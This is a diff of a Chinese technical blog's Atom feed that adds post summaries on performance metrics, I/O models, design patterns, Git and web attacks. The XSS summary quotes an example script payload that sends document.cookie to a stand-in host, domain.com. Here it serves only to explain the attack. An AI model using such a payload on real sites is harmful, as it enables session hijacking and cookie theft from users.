-      &lt;h1 id=&quot;一、性能&quot;&gt;&lt;a href=&quot;#一、性能&quot; class=&quot;headerlink&quot; title=&quot;一、性能&quot;&gt;&lt;/a&gt;一、性能&lt;/h1&gt;&lt;h2 id=&quot;性能指标&quot;&gt;&lt;a href=&quot;#性能指标&quot; class=&quot;headerlink&quot; title=&quot;性能指标&quot;&gt;&lt;/a&gt;性能指标&lt;/h2&gt;&lt;h3 id=&quot;1-响应时间&quot;&gt;&lt;a href=&quot;#1-响应时间&quot; class=&quot;headerlink&quot; title=&quot;1. 响应时间&quot;&gt;&lt;/a&gt;1. 响应时间&lt;/h3&gt;&lt;p&gt;指某个请求从发出到接收到响应消耗的时间。&lt;/p&gt;&lt;p&gt;在对响应时间进行测试时，通常采用重复请求的方式，然后计算平均响应时间。&lt;/p&gt;&lt;h3 id=&quot;2-吞吐量&quot;&gt;&lt;a href=&quot;#2-吞吐量&quot; class=&quot;headerlink&quot; title=&quot;2. 吞吐量&quot;&gt;&lt;/a&gt;2. 吞吐量&lt;/h3&gt;&lt;p&gt;指系统在单位时间内可以处理的请求数量，通常使用每秒的请求数来衡量。&lt;/p&gt;&lt;h3 id=&quot;3-并发用户数&quot;&gt;&lt;a href=&quot;#3-并发用户数&quot; class=&quot;headerlink&quot; title=&quot;3. 并发用户数&quot;&gt;&lt;/a&gt;3. 并发用户数&lt;/h3&gt;&lt;p&gt;指系统能同时处理的并发用户请求数量。&lt;/p&gt;&lt;p&gt;在没有并发存在的系统中，请求被顺序执行，此时响应时间为吞吐量的倒数。例如系统支持的吞吐量为 100 req/s，那么平均响应时间应该为 0.01s。&lt;/p&gt;
+      &lt;h1 id=&quot;一、I-O-模型&quot;&gt;&lt;a href=&quot;#一、I-O-模型&quot; class=&quot;headerlink&quot; title=&quot;一、I/O 模型&quot;&gt;&lt;/a&gt;一、I/O 模型&lt;/h1&gt;&lt;p&gt;一个输入操作通常包括两个阶段：&lt;/p&gt;&lt;ul&gt;
+&lt;li&gt;等待数据准备好&lt;/li&gt;
+&lt;li&gt;从内核向进程复制数据&lt;/li&gt;
+&lt;/ul&gt;&lt;p&gt;对于一个套接字上的输入操作，第一步通常涉及等待数据从网络中到达。当所等待数据到达时，它被复制到内核中的某个缓冲区。第二步就是把数据从内核缓冲区复制到应用进程缓冲区。&lt;/p&gt;&lt;p&gt;Unix 有五种 I/O 模型：&lt;/p&gt;&lt;ul&gt;
+&lt;li&gt;阻塞式 I/O&lt;/li&gt;
+&lt;li&gt;非阻塞式 I/O&lt;/li&gt;
+&lt;li&gt;I/O 复用（select 和 poll）&lt;/li&gt;
+&lt;li&gt;信号驱动式 I/O（SIGIO）&lt;/li&gt;
+&lt;li&gt;异步 I/O（AIO）&lt;/li&gt;
+&lt;/ul&gt;
     
     </summary>
     
@@ -440,7 +418,7 @@
       <category term="网络技术" scheme="https://sometwo7.github.io/blog/categories/%E7%BD%91%E7%BB%9C%E6%8A%80%E6%9C%AF/"/>
     
     
-      <category term="系统设计" scheme="https://sometwo7.github.io/blog/tags/%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1/"/>
+      <category term="socket" scheme="https://sometwo7.github.io/blog/tags/socket/"/>
     
   </entry>
   
@@ -449,7 +427,7 @@
     <link href="https://sometwo7.github.io/blog/51d10326.html"/>
     <id>https://sometwo7.github.io/blog/51d10326.html</id>
     <published>2019-11-05T10:02:11.000Z</published>
-    <updated>2019-12-17T08:44:09.271Z</updated>
+    <updated>2020-01-03T07:29:55.637Z</updated>
     
     <summary type="html">
     
@@ -469,11 +447,53 @@
   </entry>
   
   <entry>
+    <title>网络技术 - 系统设计基础</title>
+    <link href="https://sometwo7.github.io/blog/bf574124.html"/>
+    <id>https://sometwo7.github.io/blog/bf574124.html</id>
+    <published>2019-11-05T10:02:11.000Z</published>
+    <updated>2020-01-03T07:29:55.637Z</updated>
+    
+    <summary type="html">
+    
+      &lt;h1 id=&quot;一、性能&quot;&gt;&lt;a href=&quot;#一、性能&quot; class=&quot;headerlink&quot; title=&quot;一、性能&quot;&gt;&lt;/a&gt;一、性能&lt;/h1&gt;&lt;h2 id=&quot;性能指标&quot;&gt;&lt;a href=&quot;#性能指标&quot; class=&quot;headerlink&quot; title=&quot;性能指标&quot;&gt;&lt;/a&gt;性能指标&lt;/h2&gt;&lt;h3 id=&quot;1-响应时间&quot;&gt;&lt;a href=&quot;#1-响应时间&quot; class=&quot;headerlink&quot; title=&quot;1. 响应时间&quot;&gt;&lt;/a&gt;1. 响应时间&lt;/h3&gt;&lt;p&gt;指某个请求从发出到接收到响应消耗的时间。&lt;/p&gt;&lt;p&gt;在对响应时间进行测试时，通常采用重复请求的方式，然后计算平均响应时间。&lt;/p&gt;&lt;h3 id=&quot;2-吞吐量&quot;&gt;&lt;a href=&quot;#2-吞吐量&quot; class=&quot;headerlink&quot; title=&quot;2. 吞吐量&quot;&gt;&lt;/a&gt;2. 吞吐量&lt;/h3&gt;&lt;p&gt;指系统在单位时间内可以处理的请求数量，通常使用每秒的请求数来衡量。&lt;/p&gt;&lt;h3 id=&quot;3-并发用户数&quot;&gt;&lt;a href=&quot;#3-并发用户数&quot; class=&quot;headerlink&quot; title=&quot;3. 并发用户数&quot;&gt;&lt;/a&gt;3. 并发用户数&lt;/h3&gt;&lt;p&gt;指系统能同时处理的并发用户请求数量。&lt;/p&gt;&lt;p&gt;在没有并发存在的系统中，请求被顺序执行，此时响应时间为吞吐量的倒数。例如系统支持的吞吐量为 100 req/s，那么平均响应时间应该为 0.01s。&lt;/p&gt;
+    
+    </summary>
+    
+    
+      <category term="网络技术" scheme="https://sometwo7.github.io/blog/categories/%E7%BD%91%E7%BB%9C%E6%8A%80%E6%9C%AF/"/>
+    
+    
+      <category term="系统设计" scheme="https://sometwo7.github.io/blog/tags/%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>网络技术 - 设计模式</title>
+    <link href="https://sometwo7.github.io/blog/9956399c.html"/>
+    <id>https://sometwo7.github.io/blog/9956399c.html</id>
+    <published>2019-11-05T10:02:11.000Z</published>
+    <updated>2020-01-03T07:29:55.637Z</updated>
+    
+    <summary type="html">
+    
+      &lt;h1 id=&quot;一、概述&quot;&gt;&lt;a href=&quot;#一、概述&quot; class=&quot;headerlink&quot; title=&quot;一、概述&quot;&gt;&lt;/a&gt;一、概述&lt;/h1&gt;&lt;p&gt;设计模式是解决问题的方案，学习现有的设计模式可以做到经验复用。&lt;/p&gt;&lt;p&gt;拥有设计模式词汇，在沟通时就能用更少的词汇来讨论，并且不需要了解底层细节。&lt;/p&gt;&lt;h1 id=&quot;二、创建型&quot;&gt;&lt;a href=&quot;#二、创建型&quot; class=&quot;headerlink&quot; title=&quot;二、创建型&quot;&gt;&lt;/a&gt;二、创建型&lt;/h1&gt;&lt;h2 id=&quot;1-单例（Singleton）&quot;&gt;&lt;a href=&quot;#1-单例（Singleton）&quot; class=&quot;headerlink&quot; title=&quot;1. 单例（Singleton）&quot;&gt;&lt;/a&gt;1. 单例（Singleton）&lt;/h2&gt;&lt;h3 id=&quot;Intent&quot;&gt;&lt;a href=&quot;#Intent&quot; class=&quot;headerlink&quot; title=&quot;Intent&quot;&gt;&lt;/a&gt;Intent&lt;/h3&gt;&lt;p&gt;确保一个类只有一个实例，并提供该实例的全局访问点。&lt;/p&gt;&lt;h3 id=&quot;Class-Diagram&quot;&gt;&lt;a href=&quot;#Class-Diagram&quot; class=&quot;headerlink&quot; title=&quot;Class Diagram&quot;&gt;&lt;/a&gt;Class Diagram&lt;/h3&gt;&lt;p&gt;使用一个私有构造函数、一个私有静态变量以及一个公有静态函数来实现。&lt;/p&gt;
+    
+    </summary>
+    
+    
+      <category term="网络技术" scheme="https://sometwo7.github.io/blog/categories/%E7%BD%91%E7%BB%9C%E6%8A%80%E6%9C%AF/"/>
+    
+    
+      <category term="设计模式" scheme="https://sometwo7.github.io/blog/tags/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"/>
+    
+  </entry>
+  
+  <entry>
     <title>网络技术 - 构建工具</title>
     <link href="https://sometwo7.github.io/blog/4ad173cd.html"/>
     <id>https://sometwo7.github.io/blog/4ad173cd.html</id>
     <published>2019-11-05T10:02:11.000Z</published>
-    <updated>2019-12-17T08:44:09.271Z</updated>
+    <updated>2020-01-03T07:29:55.637Z</updated>
     
     <summary type="html">
     
@@ -486,6 +506,48 @@
     
     
       <category term="构建工具" scheme="https://sometwo7.github.io/blog/tags/%E6%9E%84%E5%BB%BA%E5%B7%A5%E5%85%B7/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>网络技术 - 攻击技术</title>
+    <link href="https://sometwo7.github.io/blog/877061f8.html"/>
+    <id>https://sometwo7.github.io/blog/877061f8.html</id>
+    <published>2019-11-05T10:02:11.000Z</published>
+    <updated>2020-01-03T07:29:55.637Z</updated>
+    
+    <summary type="html">
+    
+      &lt;h1 id=&quot;一、跨站脚本攻击&quot;&gt;&lt;a href=&quot;#一、跨站脚本攻击&quot; class=&quot;headerlink&quot; title=&quot;一、跨站脚本攻击&quot;&gt;&lt;/a&gt;一、跨站脚本攻击&lt;/h1&gt;&lt;h2 id=&quot;概念&quot;&gt;&lt;a href=&quot;#概念&quot; class=&quot;headerlink&quot; title=&quot;概念&quot;&gt;&lt;/a&gt;概念&lt;/h2&gt;&lt;p&gt;跨站脚本攻击（Cross-Site Scripting, XSS），可以将代码注入到用户浏览的网页上，这种代码包括 HTML 和 JavaScript。&lt;/p&gt;&lt;h2 id=&quot;攻击原理&quot;&gt;&lt;a href=&quot;#攻击原理&quot; class=&quot;headerlink&quot; title=&quot;攻击原理&quot;&gt;&lt;/a&gt;攻击原理&lt;/h2&gt;&lt;p&gt;例如有一个论坛网站，攻击者可以在上面发布以下内容：&lt;/p&gt;&lt;figure class=&quot;highlight html&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;javascript&quot;&gt;location.href=&lt;span class=&quot;string&quot;&gt;&quot;//domain.com/?c=&quot;&lt;/span&gt; + &lt;span class=&quot;built_in&quot;&gt;document&lt;/span&gt;.cookie&lt;/span&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+    
+    </summary>
+    
+    
+      <category term="网络技术" scheme="https://sometwo7.github.io/blog/categories/%E7%BD%91%E7%BB%9C%E6%8A%80%E6%9C%AF/"/>
+    
+    
+      <category term="攻击" scheme="https://sometwo7.github.io/blog/tags/%E6%94%BB%E5%87%BB/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>网络技术 - Git</title>
+    <link href="https://sometwo7.github.io/blog/685bfdc8.html"/>
+    <id>https://sometwo7.github.io/blog/685bfdc8.html</id>
+    <published>2019-11-05T10:02:11.000Z</published>
+    <updated>2020-01-03T07:29:55.637Z</updated>
+    
+    <summary type="html">
+    
+      &lt;h1 id=&quot;集中式与分布式&quot;&gt;&lt;a href=&quot;#集中式与分布式&quot; class=&quot;headerlink&quot; title=&quot;集中式与分布式&quot;&gt;&lt;/a&gt;集中式与分布式&lt;/h1&gt;&lt;p&gt;Git 属于分布式版本控制系统，而 SVN 属于集中式。&lt;/p&gt;&lt;div align=&quot;center&quot;&gt; &lt;img src=&quot;pics/1fe2dc77-9a2d-4643-90b3-bbf50f649bac.png&quot; width=&quot;600px&quot;&gt; &lt;/div&gt;&lt;br&gt;&lt;p&gt;集中式版本控制只有中心服务器拥有一份代码，而分布式版本控制每个人的电脑上就有一份完整的代码。&lt;/p&gt;&lt;p&gt;集中式版本控制有安全性问题，当中心服务器挂了所有人都没办法工作了。&lt;/p&gt;&lt;p&gt;集中式版本控制需要连网才能工作，如果网速过慢，那么提交一个文件会慢的无法让人忍受。而分布式版本控制不需要连网就能工作。&lt;/p&gt;
+    
+    </summary>
+    
+    
+      <category term="网络技术" scheme="https://sometwo7.github.io/blog/categories/%E7%BD%91%E7%BB%9C%E6%8A%80%E6%9C%AF/"/>
+    
+    
+      <category term="git" scheme="https://sometwo7.github.io/blog/tags/git/"/>
     
   </entry>
   
